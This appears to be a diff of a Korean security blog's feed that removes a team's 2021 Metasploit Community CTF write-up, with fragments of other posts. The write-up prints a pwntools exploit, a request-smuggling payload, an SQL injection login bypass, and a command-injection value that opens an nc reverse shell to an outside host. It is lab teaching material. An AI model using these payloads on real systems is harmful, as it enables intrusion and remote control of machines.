+&lt;p&gt;Chapter 2에서는 XKeyScore, Phone CID Backdoor와 같은 복잡하고 높은 기술력을 필요로하는 도구들에 대해 설명드릴 예정입니다. 특히 XKeyScore의 경우, 실제로 NSA에서 사용하던 감시체계의 이름이기도 합니다.&lt;/p&gt;
+
+&lt;p&gt;혹시 “NITE Team 4”를 이미 플레이 해 보신 분은 &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt;, &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;와 같은 플랫폼에서 실전 해킹을 탐구하고 연습 해 보셔도 좋겠네요.&lt;/p&gt;
+
+&lt;p&gt;이 포스팅은 시리즈로 이어집니다! 여러분의 많은 관심 부탁드립니다 :)&lt;/p&gt;</content><author><name>김도현</name></author><category term="R&amp;D" /><summary type="html">NITE Team 4</summary></entry><entry xml:lang="ko"><title type="html">Analyzing Django ORM with 1-day vulnerabilities and sql bug</title><link href="http://ufo.stealien.com/id/2022-12-16/analyzing-django-orm-with-1-day" rel="alternate" type="text/html" title="Analyzing Django ORM with 1-day vulnerabilities and sql bug" /><published>2022-12-16T00:00:00+09:00</published><updated>2022-12-16T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-12-16/analyzing-django-orm-with-1-day-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-12-16/analyzing-django-orm-with-1-day">&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 &lt;div style=&quot;text-align: left&quot;&gt;목차&lt;/div&gt;
 &lt;div style=&quot;text-align: left&quot;&gt;
     &lt;a href=&quot;#0-introduction&quot;&gt;0. Introduction&lt;/a&gt;
@@ -2322,469 +2661,4 @@ diff --git a/lib/iov_iter.c b/lib/iov_iter.c
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;최종적으로 pipe_write 함수를 호출하면, buf-&amp;gt;flags &amp;amp; PIPE_BUF_FLAG_CAN_MERGE를 통과하고 copy_page_from_iter 함수 호출과 함께 buf→page에 있는 page cache가 우리의 데이터로 덮히게 된다. 다시 똑같은 파일을 읽게 된다면, 우리가 수정한 내용이 담겨있는 page cache를 읽게된다.&lt;/p&gt;</content><author><name>seonungjang</name></author><category term="R&amp;D" /><summary type="html">DirtyPipe Review</summary></entry><entry xml:lang="ko"><title type="html">2021 Metasploit Community CTF write-up, review</title><link href="http://ufo.stealien.com/id/2021-12-07/Metasploit-CTF-Review" rel="alternate" type="text/html" title="2021 Metasploit Community CTF write-up, review" /><published>2021-12-07T01:30:00+09:00</published><updated>2021-12-07T01:30:00+09:00</updated><id>http://ufo.stealien.com/2021-12-07/Metasploit-CTF-review-ko</id><content type="html" xml:base="http://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review">&lt;h1 id=&quot;2021-metasploit-community-ctf-write-up-review&quot;&gt;2021 Metasploit Community CTF write-up, review&lt;/h1&gt;
-
-&lt;p&gt;PoSTLTimes(PostalTimes + STLCTF)이라는 팀명으로 진행했다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;2-of-clubs-black-joker&quot;&gt;2 of Clubs, Black Joker&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Jang Jaehoon&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;20000/tcp 포트로 접근 시, 바이너리를 다운 받을 수 있다. 이 바이너리는 타겟 서버의 20001/tcp와 통신하며 타겟 바이너리의 문제를 해결 시 플래그를 받을 수 있다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strace&lt;/code&gt;를 사용하여 통신하는 규칙을 분석 후, 문제를 해결 할 수 있었다.&lt;/p&gt;
-
-&lt;p&gt;바이너리는 서버로부터 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt; 좌표 값을 받으며 사용자가 이를 클릭 할 시에 서버로 클릭한 좌표 값을 전송한다. 이를 전부 완수하게 될 경우 플래그를 획득할 수 있다.&lt;/p&gt;
-
-&lt;h3 id=&quot;easy-challenge&quot;&gt;Easy Challenge&lt;/h3&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;json&lt;/code&gt; 형태로 통신한다. 단순히 이 값들을 프로토콜에 맞게 전송 해 주면 된다.&lt;/p&gt;
-
-&lt;h3 id=&quot;hard-challenge&quot;&gt;Hard Challenge&lt;/h3&gt;
-
-&lt;p&gt;Binary 형태로 통신한다. 해당 binary 값들을 이용하여 문제를 해결 할 수 있다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;2-of-spades&quot;&gt;2 of Spades&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Dohyun Kim (@d0now)&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;443/tcp 포트로 접근 시, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Under Construction!&lt;/code&gt;이라는 문구를 발견 할 수 있다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;를 이용한 directory scanning으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/.git/HEAD&lt;/code&gt; 폴더를 발견 할 수 있었으며, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GitHacker&lt;/code&gt; 프로젝트를 이용하여 레포지토리 정보를 받아 올 수 있다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git cat-file -p 1e4988fd28fdfb4116f7203451e6cf1b6c51ea43
-username=root
-password=password123
-flag_location=3e6f0e21-7faa-429f-8a1d-3f715a520da4.png
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;해당 경로로 접근 시 플래그를 획득할 수 있었다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;3-of-clubs&quot;&gt;3 of Clubs&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Dohyun Kim (@d0now)&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;30033/tcp 포트로 접근 시 하나의 ELF 프로그램을 획득 할 수 있다. 이 프로그램은 30034/tcp에서 동작하고 있으며, 프로그램을 분석하여 조건을 만족해 플래그를 획득할 수 있었다.&lt;/p&gt;
-
-&lt;p&gt;프로그램은 간단한 stack 기반 계산기였으며, 여타 pwnable의 vm 문제와 같이 접근 시 문제를 쉽게 해결할 수 있다.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;OP_LSH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;OP_RSH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc1&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;OP_MUL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd0&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;OP_DIV&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xe0&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;OP_EXT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0006&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OP_MUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 0x6d * 0x17 = 2507
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OP_DIV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 2507 / 3 = 835
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OP_MUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OP_MUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OP_MUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OP_EXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xadde&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;3-of-hearts&quot;&gt;3 of Hearts&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Seokchan Yoon (@ch4n3)&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;33337/tcp 포트로 접근 시 웹 서비스가 존재한다. 특정한 패킷을 전송하게 되면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;를 획득할 수 있고, 이를 이용하여 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/private.php&lt;/code&gt;에 접근하여 플래그를 획득할 수 있다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /save.php?first=1 HTTP/1.1
-Host: threeofhearts.ctf.net
-Content-Encoding: chunked
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 160
-Transfer-Encoding: chunked
-
-5f
-0
-
-GET /save.php?second=1 HTTP/1.1
-Host: threeofhearts.ctf.net
-Content-Length: 40
-Cookie: 
-0
-
-GET /save.php?second=222 HTTP/1.1
-X-Access: localhost
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;4-of-clubs&quot;&gt;4 of Clubs&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Dohyun Kim (@d0now)&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;15010/tcp로 접근 시 웹 서비스가 존재한다. 회원가입 후 파일을 업로드/다운로드 할 수 있다. 다운로드 한 파일은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/users/[username]/files/[filename]&lt;/code&gt;에 저장 되는데, 아무나 접근이 가능하여 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename&lt;/code&gt;을 스캐닝하여 플래그를 획득할 수 있었다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gobuster dir -u http://localhost:31337/users/employee/files/ -c &quot;$RACK_SESSION&quot; -a &quot;$USER_AGENT&quot; -t 32 -w /usr/share/wordlists/dirb/big.txt
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://localhost:31337/users/employee/files/
-[+] Method:                  GET
-[+] Threads:                 32
-[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
-[+] Negative Status codes:   404
-[+] Cookies:                 rack.session=BAh7CUkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkUxYWY3ZDQyN2FiZTEwZTg4YTMwODNmYTdkNzJmMjBlMzZlY2JhZmMwMGU3MTI3OTM2ZmI3NjEzOWE3NTQxNTI0BjsARkkiCWNzcmYGOwBGSSIxM2RLY0tzdGlYRFBzNVBLVllwWXJQOC9oT0t6bWkxQ1hZVmEvOThWTGU2WT0GOwBGSSINdHJhY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItYzY5NzEzNGFjMTU4OWNmZjcxZjYwNGE3NTg4ZmIxYTJiMTA5MTI2MwY7AEZJIg11c2VybmFtZQY7AEZJIgphRG1pbgY7AFQ%3D--e346362309c00ead4b73f84b2ae76a89edbed0ae
-[+] User Agent:              Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
-[+] Timeout:                 10s
-===============================================================
-2021/12/04 12:50:26 Starting gobuster in directory enumeration mode
-===============================================================
-/fileadmin            (Status: 200) [Size: 169825]
-/reports              (Status: 200) [Size: 23]
-/upload               (Status: 403) [Size: 13]
-
-===============================================================
-2021/12/04 12:53:43 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fileadmin&lt;/code&gt; 파일이 플래그이다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;4-of-diamonds&quot;&gt;4 of Diamonds&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Jaehoon Jang&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;10010/tcp에 열려있는 웹 페이지의 취약점을 이용하여 문제를 해결할 수 있다.&lt;/p&gt;
-
-&lt;p&gt;다음과 같이 로그인 시 user account와 관련된 오브젝트의 정보를 획득 할 수 있다.&lt;/p&gt;
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;current_account&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;created_at&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2021-12-06T05:01:12.978Z&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;updated_at&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2021-12-06T05:01:12.978Z&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;    
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;회원가입 시 request packet에 role을 추가하여 문제를 해결할 수 있다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;4-of-hearts&quot;&gt;4 of Hearts&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Dohyun Kim&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;80/tcp에 접근 시 플래그를 획득할 수 있다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;5-of-clubs&quot;&gt;5 of Clubs&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;Dohyun Kim&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;15000/tcp에 접근 시 다음과 같이 특정한 명령을 내릴 수 있는 콘솔을 사용할 수 있다.&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc localhost 31337
-
-Welcome to the Student Database Management System!
-Time is 2021-12-03 18:03:46 +0000.
-
-Pick one of the following options:
-1. Create new student record
-2. Show student records
-3. Update an existing record
-4. Delete student record
-5. Exit
-
-Input:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;1번 메뉴를 통해 새로운 student record를 만들고 4번메뉴에서 올바른 student name을 넣어주고 student surname에서 발생하는 command injection 취약점을 이용하여 문제를 해결할 수 있다.&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Deleting a student with the following details:
-Student name: a
-Student surname: a$(nc 172.17.8.84 4444 -e /bin/sh)
-Invalid characters entered.
-
-Found student file: a_a$(nc 172.17.8.84 4444 -e /bin/sh).txt
-Deleting...
-Completed.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;5-of-diamonds&quot;&gt;5 of Diamonds&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solver is &lt;strong&gt;YouTaek Lim&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;11111/tcp에 접근 시 로그인 할 수 있는 웹페이지가 나온다. 사용자명은 admin, 패스워드에 postgresql injection을 통해 공격하여 플래그를 획득할 수 있다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username=admin&amp;amp;password='or+1=1--+-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and also we wrote blind sql injection script for it.&lt;/p&gt;
-
